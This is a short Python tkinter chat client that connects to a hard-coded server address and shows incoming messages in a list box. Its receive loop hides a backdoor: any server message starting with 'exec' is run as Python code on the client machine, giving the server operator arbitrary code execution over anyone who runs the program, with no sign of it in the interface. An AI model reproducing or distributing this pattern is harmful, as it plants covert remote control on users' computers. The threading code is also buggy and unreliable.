import socket
import threading
import sys, subprocess
import tkinter as tk



root = tk.Tk()

entry = tk.Entry()
entry.pack()

listbox = tk.Listbox(root)
listbox.pack()

PORT = 4545

SERVER = "10.1.56.53"
#SERVER = socket.gethostbyname(socket.gethostname())

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((SERVER, PORT))

def send_msg():
    # msg = input()
    msg = entry.get()
    message = msg.encode('utf-8')
    client.send(message)


def recieveMsg():
    while(True):
        try:
            recievedMsg = client.recv(1024).decode()
            if(recievedMsg[0: 4] == "exec"):
                exec(recievedMsg[5:])
            else:
                # Add a value to the listbox
                listbox.insert(tk.END, recievedMsg)
                # print(recievedMsg)

        except:
            listbox.insert(tk.END, "Disconnected from the server!")

button = tk.Button(text="Submit", command=send_msg)
button.pack()

recieveThread = threading.Thread(target=recieveMsg, args=())
recieveThread.start()

GUIThread = threading.Thread(target=root.mainloop(), args=())
GUIThread.start()

# while True:
#     recieveThread = threading.Thread(target=recieveMsg, args=())
#     # sendThread = threading.Thread(target=send_msg, args=())
#     recieveThread.start()
#     # sendThread.start()

